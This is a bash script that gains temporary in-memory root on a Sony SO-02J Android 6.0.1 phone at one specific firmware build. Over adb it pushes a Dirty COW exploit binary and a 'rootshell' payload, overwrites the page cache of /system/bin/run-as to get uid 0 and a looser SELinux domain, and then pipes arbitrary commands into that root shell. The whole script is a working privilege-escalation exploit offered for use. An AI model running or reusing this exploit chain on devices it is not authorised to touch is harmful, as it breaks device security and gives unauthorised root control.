#!/bin/bash
# SO-02J temporary (in-memory) root on Android 6.0.1 / 34.1.B.0.336
#
# /system/bin/run-as keeps its runas_exec SELinux label -> CAP_SETUID/SETGID.
# rootshell (freestanding aarch64, pure syscalls) is written into that path's
# page cache by dirtycow. It does capset/setresuid(0), switches SELinux context
# to the least-restrictive allowed domain, then execs /system/bin/sh reading
# stdin. A reboot restores stock run-as; nothing is written to /system on disk.
#
# Usage:  ./temp-root.sh 'id; getprop ro.build.display.id'
#         ./temp-root.sh < commands.txt
#         ./temp-root.sh                 # defaults to `id`
set -u

D="$(cd "$(dirname "$0")" && pwd)"
S=$(adb devices -l | awk '/product:SO-02J|model:SO_02J/ {print $1}' | head -1)
if [ -z "$S" ]; then echo "ERROR: SO-02J not found via adb"; exit 1; fi

BUILD=$(adb -s "$S" shell 'getprop ro.build.display.id' | tr -d '\r')
if [ "$BUILD" != "34.1.B.0.336" ]; then
    echo "ERROR: wrong firmware ($BUILD). This payload targets 34.1.B.0.336 only."
    exit 1
fi
echo "device=$S build=$BUILD"

# dirtycow's copyErrors self-check silently skips a second overlay on the same
# page cache, so reboot first to guarantee a clean /system/bin/run-as.
echo "rebooting to clear prior overlay..."
adb -s "$S" reboot >/dev/null 2>&1
adb -s "$S" wait-for-device >/dev/null 2>&1
for i in $(seq 1 60); do
    [ "$(adb -s "$S" shell 'getprop sys.boot_completed' 2>/dev/null | tr -d '\r')" = "1" ] && break
    sleep 5
done

adb -s "$S" push "$D/dirtycow"  /data/local/tmp/dirtycow  >/dev/null
adb -s "$S" push "$D/rootshell" /data/local/tmp/rootshell >/dev/null
adb -s "$S" shell 'chmod 755 /data/local/tmp/dirtycow /data/local/tmp/rootshell; cd /data/local/tmp && ./dirtycow /system/bin/run-as ./rootshell' 2>&1 | tail -2

# Build a command batch on the host, push it, and feed it via stdin so the
# interactive sh always terminates. Append `exit` explicitly.
TMP=$(mktemp /tmp/so02j-rootcmd.XXXXXX)
if [ $# -gt 0 ]; then printf '%s\n' "$1" > "$TMP"; else cat > "$TMP"; fi
printf 'exit\n' >> "$TMP"
adb -s "$S" push "$TMP" /data/local/tmp/rootcmd.sh >/dev/null
rm -f "$TMP"

timeout 60 adb -s "$S" shell '/system/bin/run-as < /data/local/tmp/rootcmd.sh' 2>&1
